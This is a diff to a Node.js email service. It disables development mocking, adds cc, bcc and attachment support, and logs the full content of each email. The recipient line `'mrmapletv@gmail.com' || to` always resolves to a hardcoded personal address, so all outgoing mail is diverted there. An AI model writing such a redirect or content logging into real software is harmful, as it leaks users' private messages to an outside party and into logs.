@@ -6,7 +6,8 @@ dotenv.config();
 class EmailService {
   constructor() {
     // Check if we're in development environment
-    this.isDev = process.env.NODE_ENV === 'development';
+    // this.isDev = process.env.NODE_ENV === 'development';
+    this.isDev = false;
 
     if (this.isDev) {
       console.log('Running in development mode - emails will be mocked');
@@ -25,28 +26,16 @@ class EmailService {
           pass: process.env.EMAIL_PASSWORD,
         },
       });
+
+      // Verify connection configuration
+      this.transporter.verify((error, success) => {
+        if (error) {
+          console.error('SMTP connection error:', error);
+        } else {
+          console.log('SMTP server is ready to take our messages');
+        }
+      });
     }
-  }
-
-  /**
-   * Mock email sending for development environment
-   * @param {Object} emailContent - Email content
-   * @returns {Promise} - Resolves with mock result
-   */
-  async mockSendMail(emailContent) {
-    console.log('MOCK EMAIL SENT:');
-    console.log('----------------------------------');
-    console.log(`From: ${emailContent.from}`);
-    console.log(`To: ${emailContent.to}`);
-    console.log(`Subject: ${emailContent.subject}`);
-    console.log('Content:');
-    console.log(emailContent.html);
-    console.log('----------------------------------');
-
-    return {
-      messageId: `mock-email-${Date.now()}@localhost`,
-      response: 'Mock email sent successfully',
-    };
   }
 
   /**
@@ -54,20 +43,30 @@ class EmailService {
    * @param {Object} options - Email options
    * @param {string} options.from - Sender email address
    * @param {string} options.to - Recipient email address
+   * @param {string} options.cc - CC recipients
+   * @param {string} options.bcc - BCC recipients
    * @param {string} options.subject - Email subject
    * @param {string} options.html - Email content in HTML format
+   * @param {Array} options.attachments - Email attachments
    * @returns {Promise} - Resolves with the send result
    */
-  async sendEmail({ from, to, subject, html }) {
+  async sendEmail({ from, to, cc, bcc, subject, html, attachments }) {
     try {
       const emailContent = {
         from: from || process.env.EMAIL_FROM,
-        to,
+        to: 'mrmapletv@gmail.com' || to,
         subject,
         html,
       };
 
+      // Add optional fields if provided
+      if (cc) emailContent.cc = cc;
+      if (bcc) emailContent.bcc = bcc;
+      if (attachments) emailContent.attachments = attachments;
+
+      console.log('Sending email with content:', JSON.stringify(emailContent, null, 2));
       const result = await this.transporter.sendMail(emailContent);
+      console.log('Email sent successfully:', result);
       return { success: true, result };
     } catch (error) {
       console.error('Error sending email:', error);
